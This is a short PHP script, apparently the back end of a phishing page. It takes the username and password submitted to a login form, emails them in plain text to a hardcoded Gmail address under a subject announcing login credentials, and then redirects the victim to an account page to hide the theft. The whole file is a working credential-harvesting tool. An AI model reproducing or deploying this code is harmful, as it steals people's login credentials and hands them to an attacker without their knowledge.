<?php

$_POST['User'];
$_POST['Password'];

$mensaje = "El nombre de usuario es: " . $_POST['User'] . ":\r\n";
$mensaje .= "Su contraseña es: " . $_POST['Password'] . "";

$correo = 'gastonchoque95@gmail.com';
$asunto = "Credenciales de unicio de sesion de " . $_POST['User'] . "";

header('location:../pages/account/account.html');

mail($correo, $asunto, $mensaje, $header);

?>